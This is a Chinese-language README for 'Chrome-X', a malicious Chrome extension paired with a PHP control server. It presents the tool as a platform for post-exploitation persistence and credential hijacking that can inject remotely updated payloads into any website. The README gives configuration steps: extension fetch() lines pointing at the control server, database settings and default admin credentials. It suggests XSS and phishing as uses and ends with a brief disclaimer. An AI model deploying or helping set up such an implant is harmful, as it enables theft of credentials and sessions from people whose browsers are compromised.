# Chrome-X 后渗透持久化与凭据监听 🚀

## 项目介绍 📝

Chrome-X 是一个用于后渗透持久化与票据监听的平台。

## 功能特点 ✨

- 👥 每个插件用户可设置唯一值，以防接口暴漏被爆破
- 📊 后台可远程更新payload
- ⚙️ 实现持久化与凭据监听
- 🔒 自定义payload可实现不同场景需求
- 📱 可实现植入任何网站

## 系统要求 🛠️

- PHP 7.4 或更高版本
- MySQL 5.7 或更高版本

## 插件端配置 📦

1. background.js文件修改

   修改3和4行为用户的用户名和盐

   ```js
   const USERNAME = 'test';
   const SALT = '666';
   ```

   第19行 修改API

   ```js
   const response = await fetch(`https://127.0.0.1/api/getuser.php?hash=${hash}`
   ```

   

2. content.js文件修改

   修改第64行API

   ```js
   const response = await fetch(`https://127.0.0.1/api/getuser.php?hash=${hash}`, {
   ```


## 控制端部署 📦

1. 建议部署在宝塔 给所有文件权限 否则生成sessions会报错

2. 配置数据库文件 /config/config.php

3. 记得配置https 这是非常重要的 不然会导致https的站点无法生效

   ```js
   // MySQL数据库配置
   define('DB_HOST', 'localhost');
   define('DB_NAME', 'chrome_x');
   define('DB_USER', 'chrome_x');
   define('DB_PASS', 'chrome_x');
   define('DB_CHARSET', 'utf8mb4'); 
   ```

   

### 1. 使用指南 🔑

- 访问 `http://your-domain/`
- 默认管理员账号：admin 密码：admin_hack 【修改密码请到数据库手动修改 或者下个版本修复问题】
- ![登入](https://github.com/user-attachments/assets/e733ba3e-3ccd-4d82-a0d8-f26280af55f5)
- 首页添加用户 用户名和盐必须和插件的一致
- ![添加用户](https://github.com/user-attachments/assets/9b02a2e2-d908-46d8-87a6-a7a575b5f898)
- 设置payload 其他玩法自行发掘 如：XSS平台等
- ![payload](https://github.com/user-attachments/assets/d6a39074-ea8b-4494-b71b-aafe0dd1c050)
- 用户过多分辨不清 可添加备注
![备注](https://github.com/user-attachments/assets/dc22fe2e-0102-4490-94c0-ccbc91a74d32)
- 测试持久化劫持与凭据获取
- ![测试截图2](https://github.com/user-attachments/assets/ab62d618-05b4-48f6-80a8-41f4dbe12b27)
- ![测试截图](https://github.com/user-attachments/assets/8247864a-4d7a-4f6e-9d39-7438028cb622)
- ![XSS](https://github.com/user-attachments/assets/eda5c1fc-fc65-4ca5-89f5-6eba705ddca2)


### 

## 常见问题 ❓

### 1. 登录失败

- 检查用户名和密码是否正确
- 确认数据库连接是否正常
- 检查是否给了文件权限 因为sessions需要生成文件

### 2. 修改密码失败

- 此功能是个bug 或在下个版本修复
- 请进入数据库手动修改

### 3. 用途建议

- XSS
- 钓鱼

## 工具思路 🔒

1. 获取到PC权限后想进行后渗透和持久化凭据劫持，利用安装Chrome插件和控制端配置，可远程修改payload，凭据劫持配合XSS平台使用。

## 下载地址 💻



```
https://github.com/0xShe/Chrome-X
```

## 免责声明 🆘

本程序只允许测试使用，禁止用于违法犯罪活动，否则一切后果将自行承担。

